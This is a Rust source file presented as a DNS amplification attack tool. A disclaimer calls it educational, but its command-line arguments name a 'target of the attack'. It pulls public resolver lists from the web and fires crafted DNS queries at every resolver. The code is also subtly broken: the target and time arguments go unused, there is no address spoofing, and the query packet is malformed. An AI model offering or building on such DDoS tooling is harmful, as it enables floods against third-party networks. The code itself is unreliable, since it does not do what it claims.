// DNS Amplification Script
// Author: David Stromberger
// License: MIT
// Version: 0.1.0
// Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.

use reqwest;
use std::net::IpAddr;
use std::str::FromStr;
use tokio;
use tokio::net::UdpSocket;
use clap::{Parser, command, arg};

async fn get_public_dns_servers(url: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    let response = client.get(url).send().await?.text().await?;
    let servers = response.lines().map(|s| s.trim().to_string()).collect();
    Ok(servers)
}

async fn resolve_dns(server: IpAddr, domain: &str) -> Result<Vec<u8>, std::io::Error> {
    let socket = match server {
        IpAddr::V4(_) => UdpSocket::bind(("0.0.0.0", 0)).await?,
        IpAddr::V6(_) => UdpSocket::bind(("::", 0)).await?,
    };

    // Set the query buffer
    let mut query = Vec::new();
    query.extend_from_slice(&[0; 2]); // ID
    query.extend_from_slice(&[1, 0, 0, 0, 0, 1]); // Flags
    query.extend_from_slice(&[0, 0x10]); // Query type
    query.extend_from_slice(&[0, 1]); // Query class
    for part in domain.split('.') {
        query.push(part.len() as u8);
        query.extend_from_slice(part.as_bytes());
    }
    query.push(0); // End of domain name

    let server_socket_addr = (server, 53);
    socket.send_to(&query, server_socket_addr).await?;

    Ok(vec![])
}

async fn send_queries(server: String) -> Result<(), Box<dyn std::error::Error>> {
    let ip_addr = IpAddr::from_str(&server)?;
    resolve_dns(ip_addr, "google.com").await?;
    println!("{}: query sent", server);
    Ok(())
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Target of the attack
    #[arg(required = true)]
    target: String,
    /// List of dns servers to use
    #[arg(short, long, required = false)]
    server_list: String,
    /// Time the attack should run
    #[arg(short, long, required = false)]
    time: u32,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    if args.server_list.is_empty() {
        let servers = get_public_dns_servers("https://public-dns.info/nameservers.txt").await?;
        println!("{} DNS servers found:", servers.len());
        for server in &servers {
            let result = send_queries(server.to_string()).await;
            if let Err(e) = result {
                println!("Error sending query to {}: {}", server, e);
            }
        }
        return Ok(());
    }
    Ok(())
}